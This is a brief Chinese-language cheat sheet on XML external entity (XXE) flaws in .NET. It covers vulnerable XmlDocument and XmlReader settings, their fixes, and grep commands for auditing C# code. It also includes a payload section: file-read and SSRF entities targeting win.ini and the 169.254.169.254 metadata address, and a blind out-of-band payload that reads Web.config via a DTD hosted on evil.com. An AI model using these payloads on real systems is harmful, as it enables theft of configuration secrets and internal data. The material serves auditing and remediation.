# .NET XXE

## 检测

```csharp
// XmlDocument 默认配置（.NET < 4.5.2 默认允许 DTD）
XmlDocument doc = new XmlDocument();
doc.LoadXml(input);

// XmlDocument 未禁用 Resolver
XmlDocument doc = new XmlDocument();
doc.XmlResolver = new XmlUrlResolver();  // 显式开启网络解析
doc.LoadXml(input);

// XDocument (LINQ to XML — 无DTD支持，安全)
XDocument doc = XDocument.Parse(input);

// XmlReader 未配置 DtdProcessing
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Parse;      // 危险
XmlReader reader = XmlReader.Create(new StringReader(xml), settings);
```

## 修复

```csharp
// XmlDocument
XmlDocument doc = new XmlDocument();
doc.XmlResolver = null;        // 禁止外部解析
doc.LoadXml(input);

// XmlReader
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;    // 禁止DTD
// 或 settings.DtdProcessing = DtdProcessing.Ignore;  // 忽略DTD
settings.XmlResolver = null;

// .NET 4.5.2+: XmlDocument 默认 XmlResolver = null
```

## 利用Payload

```xml
<!-- 文件读取 -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
<root>&xxe;</root>

<!-- SSRF -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]>
<root>&xxe;</root>

<!-- 盲XXE OOB -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///C:/inetpub/wwwroot/Web.config">
  <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
  %dtd;
]>
```

## 检测命令

```bash
grep -rn "XmlDocument\|LoadXml" --include="*.cs"
grep -rn "DtdProcessing\|XmlResolver\|XmlUrlResolver" --include="*.cs"
grep -rn "XmlReaderSettings\|XmlReader" --include="*.cs"
```
